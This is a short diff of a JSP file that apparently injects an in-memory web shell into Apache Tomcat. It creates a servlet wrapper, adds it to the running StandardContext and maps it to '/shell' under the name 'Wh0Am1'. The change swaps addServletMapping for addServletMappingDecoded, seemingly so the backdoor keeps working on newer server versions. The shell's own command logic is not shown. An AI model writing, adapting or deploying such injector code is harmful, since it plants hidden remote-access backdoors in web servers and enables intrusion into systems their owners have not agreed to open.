@@ -35,7 +35,7 @@
   newWrapper.setServletClass(servlet.getClass().getName());
 
   standardContext.addChild(newWrapper);
-  standardContext.addServletMapping("/shell","Wh0Am1");
+  standardContext.addServletMappingDecoded("/shell","Wh0Am1");
 %>
 <html>
 <head>
